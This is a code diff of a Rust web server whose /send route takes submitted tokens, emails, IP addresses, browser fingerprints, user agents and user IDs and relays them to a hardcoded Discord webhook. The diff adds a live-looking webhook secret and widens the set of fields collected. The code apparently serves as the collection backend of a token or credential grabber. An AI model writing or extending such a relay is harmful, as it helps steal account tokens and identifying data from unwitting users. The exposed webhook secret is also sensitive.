@@ -109,16 +109,15 @@ async fn test_handler() -> &'static str {
 }
 
 async fn send_to_discord(Json(payload): Json<Payload>) -> &'static str {
-    println!("📩 Received request: {:?}", payload); // ✅ Log request
-
-    let webhook_url = "https://discord.com/api/webhooks/YOUR-WEBHOOK-URL"; 
+    println!("📩 Received request: {:?}", payload);
+    let webhook_url = "https://discord.com/api/webhooks/1332416584156839996/uFyfp1H5vP8hxWwjBJpisON4vSOJO3OgVFJkapWlzbVFRSsy_htVi5F0eNGypyNN7IBL"; 
 
     let message = format!(
-        "**Received Payload:**\nToken: {:?}\nEmail: {:?}\nIP: {:?}",
-        payload.token, payload.email, payload.ip
+        "**New Payload Received:**\nToken: {:?}\nEmail: {:?}\nIP: {:?}\nUser Info: {:?}\nFingerprint: {:?}\nUser Agent: {:?}\nUID: {:?}",
+        payload.token, payload.email, payload.ip, payload.userinfo, payload.fingerprint, payload.ua, payload.uid
     );
 
-    println!("🔄 Sending to webhook: {}", webhook_url); // ✅ Log webhook send attempt
+    println!("🔄 Sending to webhook: {}", webhook_url);
 
     let discord_payload = DiscordPayload { content: message };
     let client = Client::new();
@@ -143,16 +142,19 @@ async fn send_to_discord(Json(payload): Json<Payload>) -> &'static str {
     }
 }
 
-
 #[tokio::main]
 async fn main() {
     let app = Router::new()
         .route("/test", get(test_handler))
         .route("/send", post(send_to_discord));
     
-    let port = env::var("PORT").unwrap_or_else(|_| "8080".to_string());
+    let port = env::var("PORT").unwrap_or_else(|_| "10000".to_string());
     let addr: SocketAddr = format!("0.0.0.0:{}", port).parse().expect("Invalid address");
 
+    println!("✅ Registered routes:");
+    println!("→ /test");
+    println!("→ /send");
+    
     println!("🚀 Server running at http://{}", addr);
 
     let listener = tokio::net::TcpListener::bind(addr).await.expect("❌ Failed to bind port");
